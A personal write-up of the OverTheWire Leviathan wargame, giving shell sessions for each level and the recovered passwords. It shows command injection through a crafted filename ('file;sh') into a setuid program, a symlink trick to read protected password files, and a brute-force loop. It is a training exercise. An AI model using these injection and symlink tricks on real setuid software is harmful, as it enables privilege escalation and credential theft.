# Leviathan Challenge OverTheWire.org

# Leviathan0 to Leviathan1
--------
```bash
leviathan0@gibson:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root       4096 Apr 23 18:06 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
```
>basic `ls` command to see all files .I saw a suspicious `hidden` folder backup created by leviathan1 
```bash
leviathan0@gibson:~$ cd .backup/
leviathan0@gibson:~/.backup$ ls -la
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Apr 23 18:04 .
drwxr-xr-x 3 root       root         4096 Apr 23 18:04 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html
```
>when cd into it , i got `bookmarks.html` file and when i read it .it shows some websites name and their content .
```bash
leviathan0@gibson:~/.backup$ cat bookmarks.html |grep -i "pass"
<DT><A HREF="http://www.goshen.edu/art/ed/teachem.htm" ADD_DATE="1146092098" LAST_CHARSET="ISO-8859-1" ID="98012771">Pass it
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```
> so i though i should probably use grep may be there some password related work or they probably simple writen pass=XXXX. so i used `grep` with `-i` flag `(which makes grep to see text as case insensitive so Pass == pass)` and searches "pass". Gotcha !! got password for leviathan1 is **`PPIfmI1qsA`**

# Leviathan1 to Leviathan2
----------------
```bash
leviathan1@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 15072 Apr 23 18:04 check
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan1@gibson:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped
leviathan1@gibson:~$ ./check
password: aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz
Wrong password, Good Bye ...
```
> Saw a binary file named check . tried to run it .it asks for password and check for password and prints `Wrong password, Good Bye...` . so i tried to see what basically happening in its code . used basic reverse engineering strace ,ltrace commands .
```bash
eviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80491e6, 1, 0xffffd5f4, 0 <unfinished ...>
printf("password: ")                                                                              = 10
getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: abc
)                                               = 97
getchar(0xf7fbe4a0, 0xf7fd6f61, 0x786573, 0x646f67)                                               = 98
getchar(0xf7fbe4a0, 0xf7fd6261, 0x786573, 0x646f67)                                               = 99
strcmp("abc", "sex")                                                                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                              = 29
+++ exited (status 0) +++
leviathan1@gibson:~$ ./check
password: sex
$ whoami
leviathan2
$ bash -i
leviathan2@gibson:~$ cd /etc/leviathan_pass/
leviathan2@gibson:/etc/leviathan_pass$ ls
leviathan0  leviathan1  leviathan2  leviathan3  leviathan4  leviathan5  leviathan6  leviathan7
leviathan2@gibson:/etc/leviathan_pass$ cat leviathan2
mEh5PNl10e
```
>ltrace shows that its string compare the given password with `sex` (lol why the hell game developer think that as a passwd) .so then i rerun the program without ltrace and put password sex. It gives me a terminal with `privilege escalation `of `leviathan2.` so i simple go to `/etc/leviathan_pass/` and cat the passwd. Gotcha !!! got password for leviathan2 is **`mEh5PNl10e`**

# Leviathan2 to Leviathan3
---------
```bash
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```
>got a binary file named `printfile` which takes file name as a argument and prints . i tried to print `leviathan3 passwd` file but it shows `error`. i tried to debug it with *`radare2`* (sorry i dont know how to show code of radare2 ) it showed me a map of a main function first they try to access the file if the file accessible then they try `system(/bin/cat filename`).if file is not accessible then they print that same error we got.
```bash
leviathan2@gibson:~$ touch 'file;sh'
touch: cannot touch 'file;sh': Permission denied
leviathan2@gibson:~$ cd /tmp
leviathan2@gibson:/tmp$ touch 'file;sh'
leviathan2@gibson:/tmp$ ~/printfile 'file;sh'
/bin/cat: file: Permission denied
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Q0G8j4sakn
```
>To `bypass access function` condition we create a our own file with valid name in tmp folder as i dont have permission to create file in anywhere else tmp. after access function give that file name to system function it will run cat on filename but here is a catch we can use `;` to try other command also on same function. we can try `file;sh` as filename which will cat file and then run sh which give us shell with id of leviathan3. Gotcha!!! got password for leviathan3 is **`Q0G8j4sakn`**

# Leviathan3 to Leviathan4
-----------------
```bash
leviathan3@gibson:~$ ls -la
total 40
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 18072 Apr 23 18:04 level3
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan3@gibson:~$ file level3 
level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8e23aebeb7072ef40e46bf2bfe6cb18d7b811c2e, for GNU/Linux 3.2.0, with debug_info, not stripped
leviathan3@gibson:~$ ./level3 
Enter the password> abcde
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd5f4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                       = -1
printf("Enter the password> ")                                   = 20
fgets(Enter the password> abcde
"abcde\n", 256, 0xf7e2a620)                                = 0xffffd3cc
strcmp("abcde\n", "snlprintf\n")                                 = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                       = 19
+++ exited (status 0) +++
leviathan3@gibson:~$
```
>this time we got binary file name level3. when i run it , it asks for passwd and give error message on wrong password. i again tried `ltrace` to see whats happening behind it. it showed there is string compare with `snlprintf` .so i tried to rerun the program with passwd `snlprintf`.
```bash
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
```
>After putting the passwd we got a `shell` with the id of leviathan 4 .hence we can easily read the passwd. Gotcha !!! got  password for leviathan 4 is **`AgvropI4OA`**

# Leviathan4 to Leviathan5
----
```bash
leviathan4@gibson:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Apr 23 18:04 .
drwxr-xr-x 83 root root       4096 Apr 23 18:06 ..
-rw-r--r--  1 root root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root        807 Jan  6  2022 .profile
dr-xr-x---  2 root leviathan4 4096 Apr 23 18:04 .trash
leviathan4@gibson:~$ cd .trash
leviathan4@gibson:~/.trash$ ls -la
total 24
dr-xr-x--- 2 root       leviathan4  4096 Apr 23 18:04 .
drwxr-xr-x 3 root       root        4096 Apr 23 18:04 ..
-r-sr-x--- 1 leviathan5 leviathan4 14928 Apr 23 18:04 bin
leviathan4@gibson:~/.trash$ file bin
bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=27f52c687c97c02841058c6b6ae07efe97f23226, for GNU/Linux 3.2.0, not stripped
leviathan4@gibson:~/.trash$ ./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
```
>we got a hidden folder `.trash` i opened it and i got a binary file named `bin` . after running the file it prints some kind of `binary code`. i tried to decode binary to ascii through online website *`cyberchef`* . it give me a text looking like a passwd i tried it on leviathan5. Gotcha !!! We got passwd for leviathan5 is **`EKKlTF1Xqs`**

# Leviathan5 to Leviathan6
-------
```bash
leviathan5@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15132 Apr 23 18:04 leviathan5
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan5@gibson:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=83b35709d62a0f67c8590bce094c269179e87087, for GNU/Linux 3.2.0, not stripped
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ echo "bash" > /tmp/file.log ; ltrace ~/leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd5c4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                      = 0x804d1a0
fgetc(0x804d1a0)                                                 = 'b'
feof(0x804d1a0)                                                  = 0
putchar(98, 0x804a008, 0xf7c184be, 0xf7fbe4a0)                   = 98
fgetc(0x804d1a0)                                                 = 'a'
feof(0x804d1a0)                                                  = 0
putchar(97, 0x804a008, 0xf7c184be, 0xf7fbe4a0)                   = 97
fgetc(0x804d1a0)                                                 = 's'
feof(0x804d1a0)                                                  = 0
putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0)                  = 115
fgetc(0x804d1a0)                                                 = 'h'
feof(0x804d1a0)                                                  = 0
putchar(104, 0x804a008, 0xf7c184be, 0xf7fbe4a0)                  = 104
fgetc(0x804d1a0)                                                 = '\n'
feof(0x804d1a0)                                                  = 0
putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0bash
)                   = 10
fgetc(0x804d1a0)                                                 = '\377'
feof(0x804d1a0)                                                  = 1
fclose(0x804d1a0)                                                = 0
getuid()                                                         = 12005
setuid(12005)                                                    = 0
unlink("/tmp/file.log")                                          = 0
+++ exited (status 0) +++
leviathan5@gibson:~$ echo "bash" > /tmp/file.log ;~/leviathan5 
bash
leviathan5@gibson:~$
```
>This time we got a binary file named `leviathan5` . when i run the file it tells me that he didnt find a file named file.log in temp folder . may be the file related to it. so i created the file with text bash and runned `ltrace` to see whats happening . it prints the text in file character by character .so its simple file printer we cant manipulate with some `code injections`. so may be we name passwd file of next level as `file.log` and put in tmp folder. it will read for us as the program as priviledges of `leviathan6`.
```bash
leviathan5@gibson:~$ cp /etc/leviathan_pass/leviathan6 /tmp/file.log
cp: cannot open '/etc/leviathan_pass/leviathan6' for reading: Permission denied
```
>i tried to copy the file in tmp folder but i dont have read permission .may be we can make `symlink` of file in tmp folder which can direct the program to exact location of passwd file.
```bash
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ~/leviathan5 
YZ55XPVk2l
```
>it worked . Gotcha !! we got a passwd for leviathan6 is **`YZ55XPVk2l`**.
# Leviathan6 to Leviathan7
-----
```bash
leviathan6@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:05 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 15024 Apr 23 18:05 leviathan6
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan6@gibson:~$ file leviathan6 
leviathan6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b946d7a1e1d2e52404c75c7a5410c61151b63bce, for GNU/Linux 3.2.0, not stripped
leviathan6@gibson:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
leviathan6@gibson:~$ ./leviathan6 9999
Wrong
```
> Again we got a binary file named `leviathan6`. i run it .it showed the usage that i takes `4 digit code` as a argument. i runned the program with 9999 code i prints `Wrong` . so i though instead of reverse engineering and see to what it compares the code . we can simply `bruteforce` 0 to 9999 code.
```bash
leviathan6@gibson:~$ vim /tmp/script.sh
leviathan6@gibson:~$ cat /tmp/script.sh
#!/bin/bash


for a in {0000..9999}
do
~/leviathan6 $a
echo $a
done
leviathan6@gibson:~$ /tmp/script.sh
...
..
.
Wrong
7117
Wrong
7118
Wrong
7119
Wrong
7120
Wrong
7121
Wrong
7122
$ id
uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
$ bash -i
leviathan7@gibson:~$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
```
>To type a `bash script` i go to tmp folder and typed `vim script.sh` then i was surprise that there was already a script written by *`somebody`* . i runned that script and the program give a shell at code `7122`. the shell was with privileges of leviathan7 hence we can cat the passwd. Gotcha !!! we got the passwd for leviathan7 is **`8GpZ5f8Hze`**.

# Leviathan7 CONGRATULATIONS
--------
```bash
leviathan7@gibson:~$ ls
CONGRATULATIONS
leviathan7@gibson:~$ file CONGRATULATIONS 
CONGRATULATIONS: ASCII text
leviathan7@gibson:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

## So finally i completed the challenge .


